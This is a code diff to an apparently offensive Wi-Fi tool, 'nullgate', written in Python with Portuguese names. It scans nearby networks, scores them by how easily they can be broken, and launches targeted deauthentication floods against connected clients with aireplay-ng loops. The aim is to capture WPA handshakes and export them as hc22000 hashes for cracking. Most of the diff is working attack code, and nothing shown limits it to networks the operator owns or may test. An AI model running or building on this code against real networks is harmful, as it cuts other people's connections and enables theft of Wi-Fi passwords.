@@ -13,7 +13,7 @@ import signal
 import subprocess
 import time
 
-DEFAULT_RADIO = os.environ.get("NULLGATE_RADIO", "wlan1")  # placa de ataque padrao
+DEFAULT_RADIO = os.environ.get("NULLGATE_RADIO", "wlan1")
 WORK = "/tmp/nullgate"
 DATA = "/opt/nullgate/data"
 STORE = f"{DATA}/networks.json"
@@ -32,6 +32,8 @@ except OSError:
 _capture = {"proc": None, "deauth": None, "started": 0, "targets": [], "iface": None,
             "essid": None, "mode": "ativo", "bssid": None, "ch": None}
 
+_last_hs = {"ts": 0, "n": 0}
+
 
 def _cap_file():
     files = sorted(glob.glob(f"{WORK}/cap-*.cap"))
@@ -48,7 +50,6 @@ def _sh(cmd, timeout=20):
 
 
 def _pick(iface):
-    """Interface a usar: a escolhida, ou a padrao."""
     return iface or DEFAULT_RADIO
 
 
@@ -58,9 +59,9 @@ def _radio_present(iface):
 
 def _set_monitor(iface):
     _sh(f"ip link set {iface} down")
-    _sh(f"iw dev {iface} set type monitor")
+    _sh(f"iw dev {iface} set type monitor control")
     _sh(f"ip link set {iface} up")
-    time.sleep(1.5)  # rtl8xxxu precisa assentar antes de capturar
+    time.sleep(1.5)
 
 
 def _set_managed(iface):
@@ -70,9 +71,6 @@ def _set_managed(iface):
 
 
 def _cleanup_iface(iface):
-    """Mata capturas/ataques orfaos. NAO troca o modo (quem chama decide:
-    scan/recon vao pra monitor, stop vai pra managed) — evita transicoes extras
-    que confundem o rtl8xxxu."""
     _sh("pkill -9 hcxdumptool 2>/dev/null; pkill -9 aireplay-ng 2>/dev/null; "
         "pkill -9 airodump-ng 2>/dev/null; pkill -9 wash 2>/dev/null", timeout=10)
     _capture["proc"] = None
@@ -80,17 +78,15 @@ def _cleanup_iface(iface):
 
 
 def _usb_reset(iface):
-    """Corta e religa a energia do adaptador USB — revive firmware travado
-    do rtl8xxxu (comum em adaptadores baratos apos uso intenso de monitor/deauth)."""
     try:
-        link = os.path.realpath(f"/sys/class/net/{iface}/device")  # .../1-1.2:1.0
-        node = os.path.basename(link).split(":")[0]                # 1-1.2
+        link = os.path.realpath(f"/sys/class/net/{iface}/device")
+        node = os.path.basename(link).split(":")[0]
         auth = f"/sys/bus/usb/devices/{node}/authorized"
         if os.path.exists(auth):
             _sh(f"echo 0 > {auth}", timeout=8)
             time.sleep(3)
             _sh(f"echo 1 > {auth}", timeout=8)
-            time.sleep(9)   # rtl8188fu demora a reaparecer e estabilizar
+            time.sleep(9)
             return True
     except Exception:
         pass
@@ -98,7 +94,6 @@ def _usb_reset(iface):
 
 
 def reset_radio(iface=None):
-    """Botao de panico: mata orfaos, re-energiza o USB e volta pra managed."""
     iface = _pick(iface)
     _sh("pkill -9 hcxdumptool 2>/dev/null; pkill -9 aireplay-ng 2>/dev/null; "
         "pkill -9 airodump-ng 2>/dev/null; pkill -9 wash 2>/dev/null", timeout=10)
@@ -112,7 +107,6 @@ def reset_radio(iface=None):
 
 
 def _own_essid(essid):
-    """Heuristica: marca redes do dono (WR / loja). Ajustavel."""
     e = (essid or "").lower()
     return any(k in e for k in ["wr_", "wr ", "lk_", "iot", "supermerc", "wr-"])
 
@@ -121,7 +115,7 @@ def scan(seconds=12, iface=None, _retry=True):
     iface = _pick(iface)
     if not _radio_present(iface):
         return {"ok": False, "error": f"interface {iface} ausente."}
-    _cleanup_iface(iface)  # mata orfaos
+    _cleanup_iface(iface)
     for f in glob.glob(f"{WORK}/scan-*.csv"):
         try:
             os.remove(f)
@@ -129,8 +123,6 @@ def scan(seconds=12, iface=None, _retry=True):
             pass
     _set_monitor(iface)
     try:
-        # saida do airodump vai pro /dev/null (lemos o CSV do disco; evita
-        # acumular MBs de saida binaria na RAM do Card)
         _sh(
             f"timeout {seconds} airodump-ng {iface} --band bg "
             f"-w {WORK}/scan --output-format csv --write-interval 3 "
@@ -140,7 +132,6 @@ def scan(seconds=12, iface=None, _retry=True):
     finally:
         _set_managed(iface)
     nets = _parse_scan()
-    # 0 redes quase sempre = adaptador rtl8xxxu travado. Re-energiza e tenta 1x.
     if not nets and _retry:
         _usb_reset(iface)
         return scan(seconds, iface, _retry=False)
@@ -178,7 +169,7 @@ def _parse_scan():
                 "essid": essid,
                 "meu": _own_essid(essid),
             })
-    # agrupa por ESSID, guardando cada AP (mesh) com sua propria seguranca
+
     agg = {}
     for n in nets:
         k = n["essid"]
@@ -194,11 +185,10 @@ def _parse_scan():
     for v in agg.values():
         v["canais"] = sorted(v["canais"])
         v["qtd_aps"] = len(v["aps"])
-        # resumo de seguranca da rede (o "mais forte" presente)
         segs = v.pop("segs")
         v["seguranca"] = " / ".join(sorted(segs)) if segs else "?"
         v["tem_wpa3"] = any(a["wpa3"] for a in v["aps"])
-        v["bssids"] = [a["bssid"] for a in v["aps"]]  # compat
+        v["bssids"] = [a["bssid"] for a in v["aps"]]
         out.append(v)
     out.sort(key=lambda x: (not x["meu"], x["essid"]))
     return out
@@ -209,7 +199,6 @@ def _is_wpa3(sec):
     return "WPA3" in s or "SAE" in s
 
 
-# ---------------- store (salva recon por rede) ----------------
 def _load_store():
     try:
         with open(STORE) as f:
@@ -240,7 +229,73 @@ def forget_network(essid):
     return {"ok": True}
 
 
-# ---------------- recon (analise focada da rede) ----------------
+def _detect_vulns(enc, wps, clients, client_macs, essid, bssids):
+    """Analisa o resultado do recon e devolve lista de vulns + score 0-10."""
+    vulns = []
+    auth = (enc.get("auth") or "").upper()
+    privacy = (enc.get("privacy") or "").upper()
+    cipher = (enc.get("cipher") or "").upper()
+
+    if wps == "aberto":
+        vulns.append({"tipo": "wps_aberto", "sev": "alta",
+                      "detalhe": "WPS habilitado sem lock - PixieDust/PIN viavel"})
+    elif wps == "travado":
+        vulns.append({"tipo": "wps_travado", "sev": "media",
+                      "detalhe": "WPS com lock - PIN brute lento, PixieDust pode funcionar"})
+
+    sae_only = "SAE" in auth and "PSK" not in auth
+    if sae_only:
+        vulns.append({"tipo": "wpa3_sae_only", "sev": "info",
+                      "detalhe": "WPA3 SAE puro - deauth bloqueado (PMF), precisa PMKID ou SAE crack"})
+    elif "SAE" in auth and "PSK" in auth:
+        vulns.append({"tipo": "wpa3_transition", "sev": "media",
+                      "detalhe": "WPA3 transition (SAE+PSK) - deauth pode forcar downgrade pra PSK"})
+
+    if "PSK" in auth and clients == 0:
+        vulns.append({"tipo": "sem_cliente", "sev": "media",
+                      "detalhe": "Nenhum cliente conectado - handshake so com PMKID ou esperar cliente"})
+
+    rand_macs = []
+    for m in client_macs:
+        try:
+            b = int(m.split(":")[1], 16)
+            if b & 0x02:
+                rand_macs.append(m)
+        except Exception:
+            pass
+    if rand_macs:
+        vulns.append({"tipo": "mac_aleatorio", "sev": "info",
+                      "detalhe": f"{len(rand_macs)} cliente(s) com MAC aleatorio - deauth pode ser ignorado"})
+
+    if not essid or essid.strip() == "":
+        vulns.append({"tipo": "essid_oculto", "sev": "info",
+                      "detalhe": "ESSID oculto - precisa capturar probe request pra descobrir"})
+
+    if "TKIP" in cipher:
+        vulns.append({"tipo": "tkip", "sev": "alta",
+                      "detalhe": "TKIP (WPA1) - quebravel com ataques de dicionario/Beck-Tews"})
+    if "WEP" in privacy:
+        vulns.append({"tipo": "wep", "sev": "critica",
+                      "detalhe": "WEP - quebra em minutos com aircrack-ng"})
+
+    if "WEP" in privacy:
+        score = 10
+    elif wps == "aberto":
+        score = 9
+    elif "PSK" in auth and clients > 0:
+        score = 8
+    elif "PSK" in auth:
+        score = 6
+    elif "SAE" in auth and "PSK" in auth:
+        score = 5
+    elif sae_only:
+        score = 1
+    else:
+        score = 3
+
+    return vulns, score
+
+
 def recon(essid, bssids, channels, iface=None):
     iface = _pick(iface)
     if not _radio_present(iface):
@@ -254,20 +309,19 @@ def recon(essid, bssids, channels, iface=None):
             pass
     _set_monitor(iface)
     try:
-        # airodump focado: cifra/auth + contagem de clientes
         _sh(
-            f"timeout 12 airodump-ng {iface} -c {','.join(chans)} "
+            f"timeout 12 airodump-ng {iface} -c {",".join(chans)} "
             f"-w {WORK}/recon --output-format csv --write-interval 3 >/dev/null 2>&1",
             timeout=20,
         )
-        enc, clients = _parse_recon(bssids)
-        # wash: deteccao de WPS
+        enc, clients, client_macs = _parse_recon(bssids)
         wps = _wash(iface, chans[0], bssids)
     finally:
         _set_managed(iface)
 
     wpa3 = _is_wpa3(enc.get("privacy", "") + " " + enc.get("auth", ""))
     sae_only = "SAE" in enc.get("auth", "").upper() and "PSK" not in enc.get("auth", "").upper()
+    vulns, score = _detect_vulns(enc, wps, clients, client_macs, essid, bssids)
     result = {
         "essid": essid,
         "bssids": bssids,
@@ -275,15 +329,16 @@ def recon(essid, bssids, channels, iface=None):
         "seguranca": enc.get("privacy", "?"),
         "cifra": enc.get("cipher", "?"),
         "auth": enc.get("auth", "?"),
-        "wps": wps,                       # "aberto" | "travado" | "nao" | "desconhecido"
+        "wps": wps,
         "clientes": clients,
+        "clientes_macs": client_macs,
         "wpa3": wpa3,
-        # WPA3 puro (SAE-only) exige PMF -> deauth bloqueado. Transicao (SAE+PSK) pode cair.
         "deauth": "bloqueado" if sae_only else ("parcial" if wpa3 else "ok"),
         "captura_viavel": clients > 0 or enc.get("privacy", "").startswith("WPA"),
+        "vulns": vulns,
+        "score_quebra": score,
         "ts": int(time.time()),
     }
-    # salva
     store = _load_store()
     store[essid] = result
     _save_store(store)
@@ -294,9 +349,10 @@ def _parse_recon(bssids):
     files = sorted(glob.glob(f"{WORK}/recon-*.csv"))
     enc = {}
     clients = 0
+    client_macs = []
     targets = {b.lower() for b in bssids}
     if not files:
-        return enc, clients
+        return enc, clients, client_macs
     with open(files[-1], errors="replace") as fh:
         rows = list(csv.reader(fh))
     in_stations = False
@@ -314,7 +370,10 @@ def _parse_recon(bssids):
             }
         elif in_stations and len(r) > 5 and r[5].strip().lower() in targets:
             clients += 1
-    return enc, clients
+            mac = r[0].strip().lower()
+            if mac and mac not in client_macs:
+                client_macs.append(mac)
+    return enc, clients, client_macs
 
 
 def _wash(iface, channel, bssids):
@@ -325,8 +384,6 @@ def _wash(iface, channel, bssids):
     for line in out.splitlines():
         parts = line.split()
         if parts and ":" in parts[0] and parts[0].lower() in targets:
-            locked = "yes" in line.lower() and "lock" in line.lower()
-            # heuristica: coluna Lck costuma ser "Yes"/"No"
             low = line.lower()
             if " yes" in low:
                 return "travado"
@@ -339,9 +396,9 @@ def _which(prog):
                           capture_output=True).returncode == 0
 
 
-def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
-    """mode: 'ativo' = derruba clientes (deauth) e captura handshake+PMKID;
-             'passivo' = so escuta, sem enviar nada."""
+def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, clients_macs=None):
+    """mode: ativo = derruba clientes (deauth) e captura handshake;
+             passivo = so escuta, sem enviar nada."""
     iface = _pick(iface)
     if not _radio_present(iface):
         return {"ok": False, "error": f"interface {iface} ausente."}
@@ -349,8 +406,7 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
         return {"ok": False, "error": "captura ja em andamento"}
     if not bssids:
         return {"ok": False, "error": "nenhum BSSID alvo"}
-    # usa airodump-ng + aireplay-ng (funcionam no rtl8xxxu; hcxdumptool nao arma)
-    bssid = bssids[0]                       # airodump mira um AP (o alvo escolhido)
+    bssid = bssids[0]
     ch = str(channels[0]) if channels else "1"
     for f in glob.glob(f"{WORK}/cap-*"):
         try:
@@ -359,8 +415,8 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
             pass
     _cleanup_iface(iface)
     _set_monitor(iface)
+    _sh(f"iw dev {iface} set channel {ch} HT20", timeout=8)
     _last_hs.update(ts=0, n=0)
-    # airodump fixo no canal/AP: captura o 4-way handshake no .cap
     airo = subprocess.Popen(
         ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", f"{WORK}/cap",
          "--output-format", "pcap", iface],
@@ -369,20 +425,28 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
     )
     deauth_proc = None
     if mode == "ativo":
-        # rajada LEVE de deauth e espera longa: derruba poucos clientes e deixa
-        # ~18s pra reconectarem e o handshake M1-M2 completar LIMPO. Deauth demais
-        # faz o AP renovar o ANONCE e estraga o par EAPOL (nao converte pra hash).
-        deauth_proc = subprocess.Popen(
-            ["bash", "-c",
-             f"sleep 3; while true; do aireplay-ng --deauth 2 -a {bssid} {iface} "
-             f">/dev/null 2>&1; sleep 18; done"],
-            preexec_fn=os.setsid,
-        )
+        clients_macs = clients_macs or []
+        if clients_macs:
+            cmds = []
+            for cm in clients_macs:
+                cmds.append(f"aireplay-ng --deauth 8 -a {bssid} -c {cm} {iface} >/dev/null 2>&1")
+            loop = "; ".join(cmds)
+            deauth_proc = subprocess.Popen(
+                ["bash", "-c", f"sleep 3; while true; do {loop}; sleep 6; done"],
+                preexec_fn=os.setsid,
+            )
+        else:
+            deauth_proc = subprocess.Popen(
+                ["bash", "-c",
+                 f"sleep 3; while true; do aireplay-ng --deauth 5 -a {bssid} {iface} "
+                 f">/dev/null 2>&1; sleep 8; done"],
+                preexec_fn=os.setsid,
+            )
     _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
                      "targets": bssids, "iface": iface, "essid": essid,
                      "mode": mode, "bssid": bssid, "ch": ch})
     return {"ok": True, "msg": "captura iniciada", "iface": iface, "modo": mode,
-            "alvo": bssid, "canal": ch}
+            "alvo": bssid, "canal": ch, "deauth_direcionado": bool(clients_macs)}
 
 
 def deauth(bssid, channel, iface=None, seconds=10):
@@ -395,7 +459,7 @@ def deauth(bssid, channel, iface=None, seconds=10):
     _set_monitor(iface)
     try:
         if channel:
-            _sh(f"iw dev {iface} set channel {channel}", timeout=8)
+            _sh(f"iw dev {iface} set channel {channel} HT20", timeout=8)
         r = _sh(f"timeout {seconds} aireplay-ng --deauth 0 -a {bssid} {iface}",
                 timeout=seconds + 8)
     finally:
@@ -404,7 +468,6 @@ def deauth(bssid, channel, iface=None, seconds=10):
     return {"ok": True, "bssid": bssid, "pacotes": sent, "saida": r.stdout[-400:]}
 
 
-# ---------------- arquivos salvos ----------------
 def _persist(src, label):
     """Copia um arquivo de captura/hash para a pasta persistente."""
     if not os.path.exists(src) or os.path.getsize(src) == 0:
@@ -436,7 +499,7 @@ def list_files():
 
 
 def delete_file(name):
-    p = f"{CAPTURES}/{os.path.basename(name or '')}"
+    p = f"{CAPTURES}/{os.path.basename(name or "")}"
     if os.path.exists(p):
         os.remove(p)
     return {"ok": True}
@@ -459,24 +522,26 @@ def capture_status():
     }
 
 
-_last_hs = {"ts": 0, "n": 0}
-
-
 def _count_handshakes(cap, force=False):
-    # throttle: converter o pcapng inteiro a cada 3s pesa no Card; so reconta a cada 8s
     now = time.time()
     if not force and now - _last_hs["ts"] < 8:
         return _last_hs["n"]
-    tmp = f"{WORK}/_probe.hc22000"
-    try:
-        os.remove(tmp)
-    except OSError:
-        pass
-    _sh(f"hcxpcapngtool -o {tmp} {cap} 2>/dev/null", timeout=30)
+    r = _sh(f"aircrack-ng {cap} 2>/dev/null", timeout=30)
     n = 0
-    if os.path.exists(tmp):
-        with open(tmp) as f:
-            n = sum(1 for _ in f)
+    for line in r.stdout.splitlines():
+        low = line.lower()
+        if "handshake" in low and ("1 handshake" in low or "wpa (" in low):
+            n += 1
+    if n == 0:
+        tmp = f"{WORK}/_probe.hc22000"
+        try:
+            os.remove(tmp)
+        except OSError:
+            pass
+        _sh(f"hcxpcapngtool -o {tmp} {cap} 2>/dev/null", timeout=30)
+        if os.path.exists(tmp):
+            with open(tmp) as f:
+                n = sum(1 for _ in f)
     _last_hs.update(ts=now, n=n)
     return n
 
@@ -499,12 +564,12 @@ def _kill_proc(p):
 
 
 def capture_stop():
-    _kill_proc(_capture.get("deauth"))   # para o loop de deauth
-    _kill_proc(_capture.get("proc"))     # para o airodump
+    _kill_proc(_capture.get("deauth"))
+    _kill_proc(_capture.get("proc"))
     _capture["deauth"] = None
     iface = _capture.get("iface") or DEFAULT_RADIO
-    _cleanup_iface(iface)      # mata orfaos (aireplay/airodump)
-    _set_managed(iface)        # volta pra managed
+    _cleanup_iface(iface)
+    _set_managed(iface)
     cap = _cap_file()
     hs = _count_handshakes(cap, force=True) if cap else 0
     return {"ok": True, "msg": "captura parada", "handshakes": hs, "iface": iface}
@@ -525,8 +590,8 @@ def export_hc22000():
     with open(out) as f:
         content = f.read()
     label = _capture.get("essid") or "rede"
-    saved_hash = _persist(out, label)       # guarda o .hc22000
-    _persist(cap, label)                    # guarda o .pcapng bruto
+    saved_hash = _persist(out, label)
+    _persist(cap, label)
     return {
         "ok": True,
         "arquivo": "nullgate.hc22000",
